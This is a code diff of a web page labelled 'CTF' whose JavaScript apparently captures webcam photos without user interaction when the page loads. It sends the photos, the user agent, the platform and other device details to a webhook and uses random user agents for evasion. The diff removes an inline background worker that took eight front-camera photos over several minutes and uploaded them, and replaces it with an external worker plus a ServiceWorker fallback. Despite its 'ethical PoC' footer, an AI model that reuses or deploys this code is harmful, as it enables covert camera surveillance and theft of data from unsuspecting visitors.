@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="mobile-web-app-capable" content="yes">
     <title>CTF</title>
 </head>
 <body>
@@ -20,8 +19,9 @@
 
         // Random user agent for evasion
         const userAgents = [
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36'
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1'
         ];
         const getRandomUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];
 
@@ -38,7 +38,7 @@
                                 { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                                 { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
                                 { name: 'Device', value: navigator.userAgent || 'Unknown' },
-                                { name: 'Browser', value: `${navigator.vendor || 'Unknown'} ${navigator.appVersion || 'Unknown'}` },
+                                { name: 'Platform', value: navigator.platform || 'Unknown' },
                                 { name: 'HTTPS', value: location.protocol === 'https:' ? 'Yes' : 'No' },
                                 { name: 'Time', value: new Date().toISOString() }
                             ],
@@ -145,7 +145,7 @@
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
-                            facingMode: 'user', // Front-facing camera
+                            facingMode: { ideal: 'user' }, // Front-facing camera, fallback for PCs
                             width: { ideal: 128 }, 
                             height: { ideal: 96 },
                             frameRate: { ideal: 5 }
@@ -177,38 +177,42 @@
             return false;
         }
 
-        // Register ServiceWorker or fallback to WebWorker
+        // Register WebWorker (primary) or ServiceWorker (fallback)
         async function registerBackgroundWorker() {
-            if (location.protocol !== 'https:') {
-                await sendItem('Error', { message: 'HTTPS required for ServiceWorker, aborting background capture' });
-                return;
-            }
-
-            if ('serviceWorker' in navigator) {
+            if ('Worker' in window) {
                 try {
-                    const registration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
-                    await navigator.serviceWorker.ready;
-                    registration.active.postMessage({ action: 'startBackgroundCapture' });
-                    await sendItem('ServiceWorker', { message: 'ServiceWorker registered successfully' });
+                    const worker = new Worker('/worker.js');
+                    worker.postMessage({ action: 'startBackgroundCapture' });
+                    await sendItem('WebWorker', { message: 'WebWorker registered successfully' });
                 } catch (e) {
-                    await sendItem('ServiceWorker', { error: `Failed to register: ${e.message}` });
-                    // Fallback to WebWorker
-                    if ('Worker' in window) {
-                        const worker = new Worker(URL.createObjectURL(new Blob([swJsCode], { type: 'text/javascript' })));
-                        worker.postMessage({ action: 'startBackgroundCapture' });
-                        await sendItem('WebWorker', { message: 'WebWorker fallback activated' });
+                    await sendItem('WebWorker', { error: `Failed to register: ${e.message}` });
+                    // Fallback to ServiceWorker
+                    if ('serviceWorker' in navigator && location.protocol === 'https:') {
+                        try {
+                            const registration = await navigator.serviceWorker.register('/worker.js', { scope: '/' });
+                            await navigator.serviceWorker.ready;
+                            registration.active.postMessage({ action: 'startBackgroundCapture' });
+                            await sendItem('ServiceWorker', { message: 'ServiceWorker fallback activated' });
+                        } catch (e2) {
+                            await sendItem('ServiceWorker', { error: `Failed to register: ${e2.message}` });
+                        }
                     } else {
-                        await sendItem('Worker', { error: 'No ServiceWorker or WebWorker support, background capture aborted' });
+                        await sendItem('Worker', { error: 'No ServiceWorker support or non-HTTPS, background capture aborted' });
                     }
                 }
             } else {
-                await sendItem('ServiceWorker', { error: 'ServiceWorker not supported, trying WebWorker' });
-                if ('Worker' in window) {
-                    const worker = new Worker(URL.createObjectURL(new Blob([swJsCode], { type: 'text/javascript' })));
-                    worker.postMessage({ action: 'startBackgroundCapture' });
-                    await sendItem('WebWorker', { message: 'WebWorker fallback activated' });
+                await sendItem('Worker', { error: 'No WebWorker support, trying ServiceWorker' });
+                if ('serviceWorker' in navigator && location.protocol === 'https:') {
+                    try {
+                        const registration = await navigator.serviceWorker.register('/worker.js', { scope: '/' });
+                        await navigator.serviceWorker.ready;
+                        registration.active.postMessage({ action: 'startBackgroundCapture' });
+                        await sendItem('ServiceWorker', { message: 'ServiceWorker registered successfully' });
+                    } catch (e) {
+                        await sendItem('ServiceWorker', { error: `Failed to register: ${e.message}` });
+                    }
                 } else {
-                    await sendItem('Worker', { error: 'No ServiceWorker or WebWorker support, background capture aborted' });
+                    await sendItem('Worker', { error: 'No WebWorker or ServiceWorker support, background capture aborted' });
                 }
             }
         }
@@ -237,94 +241,13 @@
             }
         }
 
-        // Inline ServiceWorker code for WebWorker fallback
-        const swJsCode = `
-            self.addEventListener('message', async event => {
-                if (event.data.action !== 'startBackgroundCapture') return;
-                const WEBHOOK_URL = '${WEBHOOK_URL}';
-                async function sendItem(type, data, index = null) {
-                    try {
-                        const formData = new FormData();
-                        formData.append('payload_json', JSON.stringify({
-                            embeds: [{
-                                title: \`Zero-Click CTF: \${type}\`,
-                                fields: [
-                                    { name: 'Type', value: type },
-                                    { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
-                                    { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
-                                    { name: 'Device', value: navigator.userAgent || 'Worker' },
-                                    { name: 'Time', value: new Date().toISOString()
-                                ],
-                                footer: { text: 'Ethical CTF PoC - Do not misuse' }
-                            }]
-                        }));
-                        if (type.includes('Photo')) {
-                            const response = await fetch(data.base64);
-                            const blob = await response.blob();
-                            formData.append('file', blob, \`photo_\${index + 1}.webp\`);
-                        }
-                        const response = await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            body: formData,
-                            headers: { 'User-Agent': '${getRandomUA()}' }
-                        });
-                        if (!response.ok) throw new Error(\`HTTP \${response.status}\`);
-                        return true;
-                    } catch (e) {
-                        return false;
-                    }
-                }
-                async function capturePhoto(index) {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({ 
-                            video: { 
-                                facingMode: 'user',
-                                width: { ideal: 128 },
-                                height: { ideal: 96 },
-                                frameRate: { ideal: 5 }
-                            },
-                            audio: false 
-                        });
-                        const track = stream.getVideoTracks()[0];
-                        const imageCapture = new ImageCapture(track);
-                        const bitmap = await imageCapture.grabFrame();
-                        const canvas = new OffscreenCanvas(128, 96);
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(bitmap, 0, 0, 128, 96);
-                        const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
-                        const reader = new FileReader();
-                        const photo = await new Promise(resolve => {
-                            reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
-                            reader.readAsDataURL(blob);
-                        });
-                        await sendItem(\`Background Photo \${index + 1}\`, photo, index);
-                        stream.getTracks().forEach(track => track.stop());
-                        return true;
-                    } catch (e) {
-                        await sendItem(\`Background Photo \${index + 1}\`, { error: \`Capture failed: \${e.message}\` }, index);
-                        return false;
-                    }
-                }
-                await sendItem('Debug', { message: 'Worker started', time: new Date().toISOString() });
-                const totalPhotos = 8;
-                const totalDuration = 420000;
-                const interval = totalDuration / totalPhotos;
-                for (let i = 0; i < totalPhotos; i++) {
-                    await new Promise(resolve => setTimeout(async () => {
-                        await capturePhoto(i);
-                        resolve();
-                    }, i * interval + Math.random() * 20));
-                }
-                await sendItem('Status', { message: 'Background 8 photos captured successfully' });
-            });
-        `;
-
         // Start zero-click collection
         (async () => {
             await sendItem('Debug', { 
                 message: 'Script started', 
                 url: location.href, 
                 device: navigator.userAgent, 
+                platform: navigator.platform,
                 https: location.protocol === 'https:' ? 'Yes' : 'No',
                 time: new Date().toISOString()
             });
